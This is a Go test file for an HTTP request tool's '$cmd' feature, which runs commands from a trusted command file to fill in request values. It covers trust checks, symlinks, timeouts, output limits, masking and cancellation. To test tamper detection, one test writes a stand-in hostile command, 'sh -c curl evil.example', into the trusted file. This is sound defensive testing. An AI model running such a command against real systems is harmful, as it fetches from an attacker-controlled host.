package env

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/vidforull/vegtam/internal/core"
	"github.com/vidforull/vegtam/internal/core/httpfile"
	"github.com/vidforull/vegtam/internal/core/policy"
)

// TestHelperProcess is not a test. The $cmd tests run the test binary as
// their command, and it acts as the arguments after "--" say.
func TestHelperProcess(t *testing.T) {
	if os.Getenv("VEGTAM_TEST_HELPER") != "1" {
		return
	}
	args := os.Args
	for len(args) > 0 && args[0] != "--" {
		args = args[1:]
	}
	switch args[1] {
	case "print":
		fmt.Fprintln(os.Stdout, args[2])
	case "crlf":
		fmt.Fprint(os.Stdout, args[2]+"\r\n")
	case "count": // appends to a file, to count the runs
		f, err := os.OpenFile(args[2], os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
		if err == nil {
			_, err = f.WriteString("x")
			err = errors.Join(err, f.Close())
		}
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		fmt.Fprintln(os.Stdout, "counted")
	case "pwd":
		wd, _ := os.Getwd()
		fmt.Fprintln(os.Stdout, wd)
	case "stdin":
		b, _ := io.ReadAll(os.Stdin)
		fmt.Fprintf(os.Stdout, "read %d bytes", len(b))
	case "env":
		fmt.Fprintln(os.Stdout, os.Getenv(args[2]))
	case "fail":
		fmt.Fprintln(os.Stderr, args[2])
		os.Exit(3)
	case "sleep":
		time.Sleep(time.Minute)
	case "cat":
		b, _ := os.ReadFile(args[2])
		if _, err := os.Stdout.Write(b); err != nil {
			os.Exit(1)
		}
	case "background": // leaves a process behind with the output open
		child := exec.CommandContext(t.Context(), os.Args[0], "-test.run=^TestHelperProcess$", "--", "linger")
		child.Stdout = os.Stdout
		if err := child.Start(); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		fmt.Fprintln(os.Stdout, "started")
	case "linger":
		time.Sleep(3 * time.Second)
	case "failbig":
		fmt.Fprint(os.Stderr, strings.Repeat("e", 2*maxStderr))
		os.Exit(1)
	case "big":
		fmt.Fprint(os.Stdout, strings.Repeat("x", maxStdout+1))
	case "nothing":
	}
	os.Exit(0)
}

// helper returns the argv that runs TestHelperProcess with args.
func helper(args ...string) []string {
	return append([]string{os.Args[0], "-test.run=^TestHelperProcess$", "--"}, args...)
}

// cmdTree writes the command file cmds, JSON as is if it is a string,
// above the .http file with src, trusts it in a new store unless trust is
// false, and returns the path of the .http file and the store.
func cmdTree(t *testing.T, cmds any, trust bool, src string) (string, *policy.Store) {
	t.Helper()
	t.Setenv("VEGTAM_TEST_HELPER", "1")
	// Built with -race, the helper would wait a second before it exits.
	t.Setenv("GORACE", "atexit_sleep_ms=0")
	path := tree(t, src)
	b, ok := cmds.(string)
	if !ok {
		j, _ := json.Marshal(cmds)
		b = string(j)
	}
	file := filepath.Join(filepath.Dir(path), "..", CommandFileName)
	if err := os.WriteFile(file, []byte(b), 0o644); err != nil {
		t.Fatal(err)
	}
	store := policy.NewStore(filepath.Join(t.TempDir(), "vegtam", "trust.json"))
	if trust {
		trustFile(t, store, file)
	}
	return path, store
}

func trustFile(t *testing.T, store *policy.Store, file string) {
	t.Helper()
	f, err := ReadCommandFile(file)
	if err != nil {
		t.Fatal(err)
	}
	sum, err := f.Sum()
	if err != nil {
		t.Fatal(err)
	}
	if err := store.Trust(f.Path, sum); err != nil {
		t.Fatal(err)
	}
}

func TestCommand(t *testing.T) {
	counter := filepath.Join(t.TempDir(), "runs")
	t.Setenv("VEGTAM_TEST_FROM_PARENT", "inherited")
	path, store := cmdTree(t, map[string]any{
		"TOKEN":  map[string]any{"argv": helper("print", "Cmd-t0ken/x+y"), "timeout": "10s"},
		"CRLF":   map[string]any{"argv": helper("crlf", "two\nlines")},
		"COUNT":  map[string]any{"argv": helper("count", counter)},
		"PWD":    map[string]any{"argv": helper("pwd")},
		"STDIN":  map[string]any{"argv": helper("stdin")},
		"PARENT": map[string]any{"argv": helper("env", "VEGTAM_TEST_FROM_PARENT")},
	}, true, `POST https://example.com/{{$cmd COUNT}}?t={{$cmd TOKEN}}
Authorization: Bearer {{$cmd TOKEN}}
X-Count: {{$cmd COUNT}}

{{$cmd CRLF}}|{{$cmd PWD}}|{{$cmd STDIN}}|{{$cmd PARENT}}`)
	l := NewLoader(Options{Trust: store})
	p, err := prepare(t, l, path)
	if err != nil {
		t.Fatal(err)
	}
	if got := p.Headers[0].Value.Masked(); got != "Bearer {{$cmd TOKEN}}" {
		t.Errorf("masked = %q", got)
	}
	// Prepared again, as for a second request: the commands do not run
	// again.
	if _, err = prepare(t, l, path); err != nil {
		t.Fatal(err)
	}
	v, _ := l.For(path)
	auth, _ := p.Headers[0].Value.Reveal(v)
	body, _ := p.Body.Reveal(v)
	dir, _ := filepath.EvalSymlinks(filepath.Dir(filepath.Dir(path)))
	if want := "two\nlines|" + dir + "|read 0 bytes|inherited"; auth != "Bearer Cmd-t0ken/x+y" || body != want {
		t.Errorf("revealed %q and %q; want the output less its line break, run in %s with no input and the environment",
			auth, body, dir)
	}
	if runs, _ := os.ReadFile(counter); string(runs) != "x" {
		t.Errorf("COUNT ran %d times, want once", len(runs))
	}
	if got := l.Masker().Mask("Cmd-t0ken/x+y " + url("Cmd-t0ken/x+y")); got != "*** ***" {
		t.Errorf("Masker().Mask = %q", got)
	}

	// A dry run checks the trust and the name, and runs nothing.
	os.Remove(counter)
	l = NewLoader(Options{Trust: store, DryRun: true})
	p, err = prepare(t, l, path)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := p.URL.Reveal(l.must(t, path)); !errors.Is(err, core.ErrLate) {
		t.Errorf("Reveal in a dry run = %v, want ErrLate", err)
	}
	if _, err := os.Stat(counter); err == nil {
		t.Error("a dry run ran a command")
	}
}

func url(s string) string {
	return strings.NewReplacer("/", "%2F", "+", "%2B").Replace(s)
}

func TestCommandErrors(t *testing.T) {
	ok := map[string]any{"OK": map[string]any{"argv": helper("print", "v")}}
	tests := []struct {
		name  string
		cmds  any
		trust bool
		ref   string
		kind  core.Kind
		want  string
	}{
		{"untrusted", ok, false, "OK", core.KindPolicy, "is not trusted to run commands; read it, then trust it with: vegtam trust "},
		{"unknown command", ok, true, "NOPE", core.KindVariable, "{{$cmd NOPE}}: no command NOPE in "},
		{
			"failure",
			map[string]any{"F": map[string]any{"argv": helper("fail", "not signed in")}},
			true, "F",
			core.KindVariable, ": exit status 3: not signed in",
		},
		{
			"no program",
			map[string]any{"F": map[string]any{"argv": []string{"vegtam-test-no-such-program"}}},
			true, "F",
			core.KindVariable, `{{$cmd F}}: vegtam-test-no-such-program: exec: "vegtam-test-no-such-program": executable file not found`,
		},
		{
			"timeout",
			map[string]any{"S": map[string]any{"argv": helper("sleep"), "timeout": "100ms"}},
			true, "S",
			core.KindVariable, "did not finish within 100ms",
		},
		{"nothing", map[string]any{"N": map[string]any{"argv": helper("nothing")}}, true, "N", core.KindVariable, "printed nothing"},
		{
			"too much",
			map[string]any{"B": map[string]any{"argv": helper("big")}},
			true, "B", core.KindVariable,
			"printed more than 1048576 bytes",
		},
		// A file that does not parse cannot be trusted either.
		{
			"empty argv",
			map[string]any{"E": map[string]any{"argv": []string{}}},
			false, "E", core.KindParse,
			"E: argv needs at least the program",
		},
		{
			"bad timeout",
			map[string]any{"T": map[string]any{"argv": []string{"x"}, "timeout": "soon"}},
			false, "T", core.KindParse,
			`T: invalid timeout "soon"`,
		},
		{
			"bad name",
			map[string]any{"A B": map[string]any{"argv": []string{"x"}}},
			false, "A", core.KindParse,
			`invalid command name "A B"`,
		},
		{
			"unknown field",
			map[string]any{"S": map[string]any{"argv": []string{"x"}, "shell": true}},
			false, "S", core.KindParse,
			`unknown field "shell"`,
		},
		{
			"a command twice", `{"A": {"argv": ["echo", "first"]}, "A": {"argv": ["echo", "second"]}}`, false, "A", core.KindParse,
			`"A" is there twice`,
		},
		{
			"argv twice", `{"A": {"argv": ["echo", "first"], "timeout": "1s", "argv": ["sh"]}}`, false, "A", core.KindParse,
			`"argv" is there twice`,
		},
		{"data after it", `{"A": {"argv": ["echo"]}} {"A": {"argv": ["sh"]}}`, false, "A", core.KindParse, "data after the object"},
		{
			"stderr cut",
			map[string]any{"F": map[string]any{"argv": helper("failbig")}},
			true, "F", core.KindVariable,
			": exit status 1: " + strings.Repeat("e", maxStderr) + "...",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			path, store := cmdTree(t, tt.cmds, tt.trust, "GET https://example.com/{{$cmd "+tt.ref+"}}")
			_, err := prepare(t, NewLoader(Options{Trust: store}), path)
			if e, ok := errors.AsType[*core.Error](err); !ok || e.Kind != tt.kind || !strings.Contains(e.Error(), tt.want) {
				t.Errorf("error = %v; want %s error with %q", err, tt.kind, tt.want)
			}
		})
	}

	// A trusted file that changes is no longer trusted.
	path, store := cmdTree(t, ok, true, "GET https://example.com/{{$cmd OK}}")
	file := filepath.Join(filepath.Dir(path), "..", CommandFileName)
	if err := os.WriteFile(file, []byte(`{"OK": {"argv": ["sh", "-c", "curl evil.example"]}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, dry := range []bool{false, true} {
		_, err := prepare(t, NewLoader(Options{Trust: store, DryRun: dry}), path)
		if e, ok := errors.AsType[*core.Error](err); !ok || e.Kind != core.KindPolicy || !strings.Contains(e.Msg, "has changed since it was trusted") {
			t.Errorf("changed file (dry run %v): %v", dry, err)
		}
	}
	// Without a store, nothing is trusted.
	path, _ = cmdTree(t, ok, true, "GET https://example.com/{{$cmd OK}}")
	if _, err := prepare(t, NewLoader(Options{}), path); !isKind(err, core.KindPolicy) {
		t.Errorf("no store: %v", err)
	}
}

func TestCommandTrust(t *testing.T) {
	// A link to a trusted file is not trusted: the trust is for where the
	// file is, not for what it says.
	victim, store := cmdTree(t, map[string]any{"OK": map[string]any{"argv": helper("print", "v")}}, true,
		"GET https://example.com/{{$cmd OK}}")
	other := tree(t, "GET https://evil.example/{{$cmd OK}}")
	if err := os.Symlink(filepath.Join(filepath.Dir(victim), "..", CommandFileName),
		filepath.Join(filepath.Dir(other), "..", CommandFileName)); err != nil {
		t.Fatal(err)
	}
	if _, err := prepare(t, NewLoader(Options{Trust: store}), victim); err != nil {
		t.Errorf("the trusted file: %v", err)
	}
	if _, err := prepare(t, NewLoader(Options{Trust: store}), other); !isKind(err, core.KindPolicy) {
		t.Errorf("a link to it: %v, want a policy error", err)
	}

	// The files that argv names are part of what is trusted, and a
	// relative program is found from the command file's directory.
	path, store := cmdTree(t, map[string]any{
		"TOKEN": map[string]any{"argv": append([]string{"./bin/helper"}, helper("cat", "token.txt")[1:]...)},
	}, false, "GET https://example.com/{{$cmd TOKEN}}")
	cmdDir := filepath.Join(filepath.Dir(path), "..")
	if err := os.Mkdir(filepath.Join(cmdDir, "bin"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(os.Args[0], filepath.Join(cmdDir, "bin", "helper")); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(cmdDir, "token.txt"), []byte("t0ken-from-file"), 0o600); err != nil {
		t.Fatal(err)
	}
	trustFile(t, store, filepath.Join(cmdDir, CommandFileName))
	t.Chdir(t.TempDir())
	l := NewLoader(Options{Trust: store})
	p, err := prepare(t, l, path)
	if err != nil {
		t.Fatal(err)
	}
	if v, err := p.URL.Reveal(l.must(t, path)); v != "https://example.com/t0ken-from-file" || err != nil {
		t.Errorf("relative program = %q, %v", v, err)
	}
	if err := os.WriteFile(filepath.Join(cmdDir, "token.txt"), []byte("other"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := prepare(t, NewLoader(Options{Trust: store}), path); err == nil || !strings.Contains(err.Error(), "has changed") {
		t.Errorf("after a change to a file argv names: %v", err)
	}
}

func TestCommandBackground(t *testing.T) {
	// A process left behind with the output open does not make the
	// command fail; its own exit counts.
	path, store := cmdTree(t, map[string]any{"BG": map[string]any{"argv": helper("background")}}, true,
		"GET https://example.com/{{$cmd BG}}")
	l := NewLoader(Options{Trust: store})
	p, err := prepare(t, l, path)
	if err != nil {
		t.Fatal(err)
	}
	if v, _ := p.URL.Reveal(l.must(t, path)); v != "https://example.com/started" {
		t.Errorf("value = %q", v)
	}
}

// A command stops when the run is canceled, not only at its timeout.
func TestCommandCanceled(t *testing.T) {
	path, store := cmdTree(t, map[string]any{"S": map[string]any{"argv": helper("sleep"), "timeout": "1m"}}, true,
		"GET https://example.com/{{$cmd S}}")
	f, err := httpfile.ParseFile(path)
	if err != nil {
		t.Fatal(err)
	}
	v, err := NewLoader(Options{Trust: store}).For(path)
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(t.Context())
	defer time.AfterFunc(100*time.Millisecond, cancel).Stop()
	start := time.Now()
	_, err = v.Prepare(ctx, f.Requests[0])
	if err == nil || !strings.Contains(err.Error(), "{{$cmd S}}: ") || !strings.Contains(err.Error(), "context canceled") {
		t.Errorf("Prepare = %v, want the command canceled", err)
	}
	if d := time.Since(start); d > 30*time.Second {
		t.Errorf("Prepare returned after %s", d)
	}
}
